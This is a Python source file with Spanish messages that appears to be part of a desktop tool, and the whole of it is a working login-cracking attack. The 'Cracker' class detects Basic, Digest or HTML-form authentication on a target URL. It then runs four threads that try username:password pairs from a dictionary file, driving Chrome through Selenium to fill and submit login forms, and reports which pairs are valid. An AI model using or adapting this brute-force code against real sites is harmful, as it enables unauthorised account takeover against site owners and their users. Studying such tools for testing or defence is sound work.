import threading
from PyQt6.QtCore import QThread, pyqtSignal

from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from HTTPrequest import HTTPrequest
from selenium import webdriver
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options


class Cracker(QThread, HTTPrequest):
    Info = pyqtSignal(str)

    def __init__(self, url, dictionary):
        super().__init__()
        self.url_attack = url
        self.authentication = ""
        self.dictionary = dictionary
        self.combinations = []
        self.lock_access_file = threading.Lock()
        self.lock_window = threading.Lock()
        self.index = 0
        self.number = 0
        self.options = Options()

    def detect_auth(self):
        request = {'method': 'get', 'url': self.url_attack}
        response, result = self.request(request)
        if result['status'] >= 0:
            if response.status_code == 200:
                self.authentication = 'form'
            if response.status_code == 401:
                if response.headers['WWW-Authenticate'].find('Basic') != -1:
                    self.authentication = 'basic'
                elif response.headers['WWW-Authenticate'].find('Digest') != -1:
                    self.authentication = 'digest'
        return result

    def read_dict(self):
        with open(self.dictionary) as file:
            lines = file.readlines()
            for line in lines:
                self.combinations.append(line.split(':'))

    def worker_basic(self):
        while self.index < len(self.combinations):
            self.lock_access_file.acquire()  # pedimos acceso al recurso
            [username, password] = self.combinations[self.index]
            self.index += 1
            self.lock_access_file.release()
            request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPBasicAuth(username, password)}
            response, result = self.request(request)
            if result['status'] < 0:
                self.Info.emit('Error en la conexión')

            if response.status_code == 200:
                self.Info.emit('Usuario ' + username + ' y contraseña ' + password + ' válidos')
            else:
                self.Info.emit('Usuario ' + username + ' y contraseña ' + password + ' no válidos')

    def worker_digest(self):
        while self.index < len(self.combinations):
            self.lock_access_file.acquire()  # pedimos acceso al recurso
            [username, password] = self.combinations[self.index]
            self.index += 1
            self.lock_access_file.release()
            request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPDigestAuth(username, password)}
            response, result = self.request(request)
            if result['status'] < 0:
                self.Info.emit('Error en la conexión')

            if response.status_code == 200:
                self.Info.emit('Usuario ' + username + ' y contraseña ' + password + ' válidos')

    def worker_form(self):
        try:
            self.lock_window.acquire()
            driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=self.options)
            driver.get(self.url_attack)
            if self.number < 2:
                driver.set_window_rect(0 + self.number * 700, 0, 700, 400)
            else:
                driver.set_window_rect(0+(self.number-2)*700, 400, 700, 400)
            self.number += 1
            self.lock_window.release()
            self.sleep(9-self.number)
            user_box = driver.find_element(By.XPATH, "//form/fieldset/input[@type='text']")
            pass_box = driver.find_element(By.XPATH, "//form/fieldset/input[@type='password']")
            login = driver.find_element(By.XPATH, "//form/fieldset/button[@type='button']")
            while self.index < len(self.combinations):
                user_box.clear()
                pass_box.clear()
                self.lock_access_file.acquire()  # pedimos acceso al recurso
                [username, password] = self.combinations[self.index]
                self.index += 1
                self.lock_access_file.release()
                user_box.send_keys(username)
                pass_box.send_keys(password)
                login.click()
                self.sleep(2)

            driver.close()
        except:
            self.Info.emit('No se pudieron encontrar campos del formulario ')

    def run(self):
        self.read_dict()
        self.Info.emit('Iniciando ataque...')
        result = self.detect_auth()
        if result['status'] < 0:
            self.Info.emit('No se admiten peticiones HTTP')
            self.terminate()
        thread_count = 4
        threads = []
        for i in range(thread_count):
            self.Info.emit('Basic authentication')
            if self.authentication == 'basic':
                t = threading.Thread(target=self.worker_basic)
                threads.append(t)
                t.start()
            elif self.authentication == 'digest':
                self.Info.emit('Digest authentication')
                t = threading.Thread(target=self.worker_digest)
                threads.append(t)
                t.start()
            elif self.authentication == 'form':
                self.Info.emit('Form authentication')
                t = threading.Thread(target=self.worker_form)
                threads.append(t)
                t.start()

        # Esperamos a que terminen todos los hilos antes de terminar el programa principal
        for thread in threads:
            thread.join()
        self.Info.emit('Fin del ataque')
